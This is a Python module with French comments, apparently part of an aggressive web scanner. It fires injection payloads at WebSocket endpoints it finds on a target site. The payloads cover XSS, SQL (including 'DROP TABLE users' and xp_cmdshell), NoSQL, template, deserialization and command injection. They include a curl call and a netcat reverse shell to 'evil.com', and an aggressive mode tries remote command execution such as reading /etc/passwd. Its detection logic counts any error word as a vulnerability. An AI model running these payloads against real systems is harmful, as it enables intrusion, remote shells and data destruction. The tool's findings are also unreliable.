#!/usr/bin/env python3
"""
📡 WEBSOCKETS INJECTION ULTRA-AGRESSIF — OWASP A05:2025
WebSocket message injection, NoSQL via WebSockets, XSS through WebSocket handlers
"""

import asyncio
import websockets
import json
import re
import time
from colorama import Fore, Style

class WebSocketInjection:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self.vulns = []
    
    def scan(self, params=None):
        print(f"\n{Fore.CYAN}[📡 WEBSOCKETS INJECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        params = params or []
        
        # Extraire les endpoints WebSocket depuis la page
        ws_endpoints = self._discover_websocket_endpoints()
        
        if not ws_endpoints:
            print(f"    {Fore.YELLOW}[!] {Style.RESET_ALL}Aucun endpoint WebSocket détecté")
            return []
        
        for endpoint in ws_endpoints:
            print(f"  → Test WebSocket endpoint: {endpoint}")
            try:
                asyncio.run(self._test_websocket_injections(endpoint, params or []))
            except (asyncio.TimeoutError, ConnectionError, ValueError) as e:
                print(f"    {Fore.YELLOW}[!] {Style.RESET_ALL}{e}")
        
        return self.vulns
    
    def _discover_websocket_endpoints(self):
        """Découvrir les endpoints WebSocket dans la page"""
        try:
            resp = self.engine.session.get(self.engine.url, timeout=10)
            content = resp.text
            
            # Patterns pour détecter les WebSockets
            ws_patterns = [
                r'wss?://[^"\'\s]+',
                r'new WebSocket\(["\']([^"\']+)["\']',
                r'ws://[^"\'\s]+',
                r'wss://[^"\'\s]+',
                r'websocket[^"\'\s]*["\']([^"\']+)["\']',
                r'Socket\.IO[^"\'\s]*["\']([^"\']+)["\']'
            ]
            
            endpoints = set()
            for pattern in ws_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    if match.startswith(('ws://', 'wss://')):
                        endpoints.add(match)
                    elif match.startswith('/'):
                        # Construire URL complète
                        parsed = self.engine.url.split('/')
                        ws_url = f"{parsed[0]}//{parsed[2]}{match}"
                        endpoints.add(ws_url.replace('http://', 'ws://').replace('https://', 'wss://'))
            
            return list(endpoints)
            
        except Exception as e:
            return []
    
    async def _test_websocket_injections(self, endpoint, params):
        """Tester les injections sur un endpoint WebSocket"""
        
        # Payloads d'injection WebSocket
        injection_payloads = {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>"
            ],
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "'; EXEC xp_cmdshell('dir'); --"
            ],
            'nosql_injection': [
                {"$ne": ""},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$where": "sleep(1000)"},
                {"$or": [{"1": "1"}, {"2": "2"}]}
            ],
            'command_injection': [
                ';id',
                '|whoami',
                '&&ls',
                '`cat /etc/passwd`',
                '$(id)',
                ';curl http://evil.com',
                '|nc -e /bin/sh evil.com 4444'
            ],
            'template_injection': [
                '{{7*7}}',
                '${7*7}',
                '#{7*7}',
                '{{config.items()}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}'
            ],
            'deserialization': [
                'O:8:"stdClass":0:{}',
                'rO0ABXNyABdqYXZhLnV0aWwuU2VyaWFsaXphYmxl',
                'cposix\nsystem\np0\n(Vid\np1\ntp2\nRp3\n.'
            ]
        }
        
        try:
            # Connexion WebSocket
            async with websockets.connect(endpoint, timeout=5) as websocket:
                
                # Envoyer des messages de test
                for injection_type, payloads in injection_payloads.items():
                    for payload in payloads:
                        try:
                            # Préparer le message selon le type
                            message = self._prepare_websocket_message(payload, injection_type)
                            
                            # Envoyer le message
                            await websocket.send(message)
                            
                            # Recevoir la réponse
                            response = await asyncio.wait_for(websocket.recv(), timeout=3)
                            
                            # Analyser la réponse
                            vuln_info = self._analyze_websocket_response(
                                response, payload, injection_type, endpoint
                            )
                            
                            if vuln_info:
                                self.vulns.append(vuln_info)
                                print(f"    {Fore.RED}[💥 WEBSOCKET INJECTION] {injection_type}{Style.RESET_ALL}")
                                print(f"      Payload: {str(payload)[:60]}...")
                                print(f"      Preuve: {vuln_info['evidence']}")
                                
                                # Mode agressif : essayer RCE
                                if self.aggressive and injection_type == 'command_injection':
                                    await self._try_websocket_rce(websocket, endpoint)
                                break
                                
                        except asyncio.TimeoutError:
                            continue
                        except Exception as e:
                            continue
                            
        except Exception as e:
            print(f"    {Fore.YELLOW}[!] {Style.RESET_ALL}Impossible de se connecter à {endpoint}")
    
    def _prepare_websocket_message(self, payload, injection_type):
        """Préparer le message WebSocket selon le type d'injection"""
        
        # Formats de message WebSocket courants
        message_formats = {
            'json': {
                'message': payload,
                'data': payload,
                'text': payload,
                'content': payload
            },
            'string': payload,
            'xml': f'<message>{payload}</message>',
            'custom': {
                'type': 'message',
                'payload': payload,
                'timestamp': int(time.time())
            }
        }
        
        # Essayer différents formats
        for format_name, format_data in message_formats.items():
            if format_name == 'json':
                for key, value in format_data.items():
                    return json.dumps({key: value})
            elif format_name == 'string':
                return str(format_data)
            elif format_name == 'xml':
                return format_data
            elif format_name == 'custom':
                return json.dumps(format_data)
        
        return str(payload)
    
    def _analyze_websocket_response(self, response, payload, injection_type, endpoint):
        """Analyser la réponse WebSocket pour détecter des vulnérabilités"""
        
        # Indicateurs par type d'injection
        indicators = {
            'xss': [
                '<script>alert(1)</script>',
                'alert(1)',
                'javascript:',
                'onerror=alert(1)',
                'onload=alert(1)'
            ],
            'sql_injection': [
                'sql syntax',
                'mysql_fetch',
                'ora-',
                'postgresql',
                'sqlite_',
                'warning: mysql'
            ],
            'nosql_injection': [
                'cast error',
                'bson',
                'mongodb',
                'document',
                'collection',
                'query failed'
            ],
            'command_injection': [
                'root:', 'www-data:', 'uid=', 'gid=',
                'bin/', 'etc/', 'proc/', 'dev/',
                'Darwin', 'Linux', 'Windows'
            ],
            'template_injection': [
                '49',  # 7*7 result
                'config', 'runtime', 'system',
                'template error', 'syntax error'
            ],
            'deserialization': [
                'unserialize', 'pickle', 'marshal',
                'serialization error', 'invalid object'
            ]
        }
        
        # Vérifier les indicateurs dans la réponse
        if injection_type in indicators:
            for indicator in indicators[injection_type]:
                if indicator.lower() in response.lower():
                    return {
                        'type': 'websocket_injection',
                        'injection_type': injection_type,
                        'payload': str(payload),
                        'endpoint': endpoint,
                        'evidence': f'WebSocket injection detected: {indicator}',
                        'response': response[:100]
                    }
        
        # Vérifier les erreurs générales
        error_patterns = [
            r'error', r'exception', r'warning', r'fatal',
            r'sql', r'database', r'query', r'syntax'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response, re.IGNORECASE):
                return {
                    'type': 'websocket_injection',
                    'injection_type': injection_type,
                    'payload': str(payload),
                    'endpoint': endpoint,
                    'evidence': f'WebSocket error response: {pattern}',
                    'response': response[:100]
                }
        
        return None
    
    async def _try_websocket_rce(self, websocket, endpoint):
        """Essayer RCE via WebSocket"""
        rce_payloads = [
            ';id',
            '|whoami',
            '&&ls -la',
            '`cat /etc/passwd`',
            '$(uname -a)'
        ]
        
        for payload in rce_payloads:
            try:
                message = json.dumps({'command': payload})
                await websocket.send(message)
                response = await asyncio.wait_for(websocket.recv(), timeout=3)
                
                if self._check_rce_in_response(response):
                    print(f"    {Fore.YELLOW}[⚡ WEBSOCKET RCE] {Style.RESET_ALL}{payload}")
                    self.vulns.append({
                        'type': 'websocket_rce',
                        'payload': payload,
                        'endpoint': endpoint,
                        'evidence': 'WebSocket RCE successful',
                        'response': response[:100]
                    })
                    break
                    
            except:
                continue
    
    def _check_rce_in_response(self, response):
        """Vérifier si la réponse contient des indicateurs RCE"""
        rce_indicators = [
            'root:', 'www-data:', 'uid=', 'gid=',
            'bin/', 'etc/', 'proc/', 'dev/', 'usr/',
            'Darwin', 'Linux', 'Windows', 'MINGW'
        ]
        return any(indicator in response for indicator in rce_indicators)
